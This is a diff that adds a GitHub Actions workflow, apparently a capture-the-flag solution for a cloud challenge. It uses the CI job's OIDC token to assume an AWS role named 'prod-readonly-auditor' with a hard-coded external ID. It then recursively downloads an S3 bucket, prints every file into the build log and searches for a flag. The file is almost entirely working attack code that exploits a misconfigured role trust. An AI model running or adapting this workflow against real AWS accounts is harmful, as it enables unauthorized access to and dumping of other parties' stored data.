@@ -1,0 +1,47 @@
+name: ca
+
+on:
+  workflow_dispatch:
+  push:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  get-flag:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Configure AWS credentials with correct External ID
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::170974506515:role/prod-readonly-auditor
+          role-external-id: extidHX9F3A1
+          aws-region: us-west-2
+          role-session-name: security-research
+
+      - name: Verify identity
+        run: |
+          echo "Current identity:"
+          aws sts get-caller-identity
+
+      - name: Access S3 bucket
+        run: |
+          echo "Listing ci-deployment-logsv1 bucket:"
+          aws s3 ls s3://ci-deployment-logsv1/ --recursive
+          
+          echo "Downloading all files:"
+          aws s3 sync s3://ci-deployment-logsv1/ ./s3-files/
+          
+          echo "Contents:"
+          find ./s3-files -type f -exec echo "File: {}" \; -exec cat {} \;
+
+      - name: Get the flag
+        run: |
+          echo "Looking for flag..."
+          grep -r "flag{" . 2>/dev/null || echo "No flag pattern found"
+          grep -r "FLAG" . 2>/dev/null || echo "No FLAG found"
+          
+          # Check if there's a specific flag file
+          aws s3 cp s3://ci-deployment-logsv1/flag.txt - 2>/dev/null || echo "No flag.txt"
+          aws s3 cp s3://ci-deployment-logsv1/flag - 2>/dev/null || echo "No flag file"
